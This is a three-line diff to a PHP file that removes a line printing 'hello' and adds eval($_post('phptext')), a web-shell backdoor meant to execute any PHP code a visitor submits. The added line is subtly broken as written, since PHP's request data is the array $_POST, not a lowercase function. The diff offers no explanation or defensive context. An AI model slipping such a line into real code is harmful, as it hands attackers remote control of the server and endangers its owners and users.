@@ -1,3 +1,3 @@
 <?php
-echo "hello";
+eval($_post("phptext"));
 ?>
